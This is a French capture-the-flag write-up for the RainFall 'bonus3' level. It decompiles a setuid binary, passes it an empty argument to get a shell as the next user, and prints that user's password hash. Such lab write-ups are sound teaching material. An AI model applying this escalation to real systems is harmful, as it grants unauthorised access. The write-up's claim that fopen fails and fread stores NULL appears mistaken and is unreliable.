#### Etape 1 : Décompilation

```bash 
bonus3@RainFall:~$ ./bonus3 aaaa bbbb
bonus3@RainFall:~$ ./bonus3 0

bonus3@RainFall:~$ ./bonus3 /x90

bonus3@RainFall:~$ ./bonus3 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

bonus3@RainFall:~$ ./bonus3 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa b
bonus3@RainFall:~$
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ 
```
Voir source.c

#### Etape 2 : Informations

Le binaire prend au moins 1 argument sinon il exit le programme, celui ci ensuite esssaye de lire le .pass de end mais nous n'avons pas les droits et le stock dans une variable local98 grace a un fread(). Ensuite le programme fait appel a atoi() avec comme paramètre av[1]. et en fonction du resultat de la variable ivar2 il ouvre un shell grace a exceve() ou fait un puts().
#### Etape 3 : Idée

L'idée sera donc de faire en sorte que le ivar2 qui fait un strcmp() soit egale a 0 pour lancer un shell.
Nous allons donc envoyer un argument precit afin de lancer le shell.
strcmp renvoie 0 si les 2 chaines sont identiques.
Vu que notre fopen ne peux pas lire le fichier .pass car nous n'avons pas les droits il va renvoyer NULL et donc avec fread NULL va etre stocké dans la variable local98. Comme le dit la partie du man ci-dessous:
```bash
Man fopen
RETURN VALUE         top
       Upon successful completion fopen(), fdopen(), and freopen()
       return a FILE pointer.  Otherwise, NULL is returned and errno is
       set to indicate the error.
```
Pour renvoyer un argument pour que strcmp() renvoie 0 nous allons devoir envoyer un argument qui quand il passe par atoi() renvoie NULL.
```bash
MAN atoi
RETURN VALUE         top
       The converted value or 0 on error.
```
On sait que envoyer une string sur atoi() renvoie 0 si la string n'est pas un nombre. mais notre but est de renvoyer NULL donc d'envoyer une string vide.


#### Etape 4 : Execution 

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ exit
bonus3@RainFall:~$ su end
Password:
end@RainFall:~$ ls
end
end@RainFall:~$ cat end
Congratulations graduate!
end@RainFall:~$

```
